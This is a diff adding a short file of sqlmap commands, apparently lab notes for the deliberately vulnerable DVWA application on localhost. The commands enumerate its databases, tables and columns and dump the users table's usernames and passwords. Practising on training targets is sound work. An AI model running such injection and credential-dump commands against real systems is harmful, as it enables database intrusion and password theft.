@@ -1,0 +1,11 @@
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="$COOKIE" --batch --dbs
+
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="$COOKIE" --batch -D dvwa --tables
+
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="$COOKIE" --batch -D dvwa -T users --columns
+
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="$COOKIE" --batch -D dvwa -T users -C user --dump
+
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="$COOKIE" --batch -D dvwa -T users -C password --dump
+
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="$COOKIE" --batch -D dvwa -T users -C user,password --dump
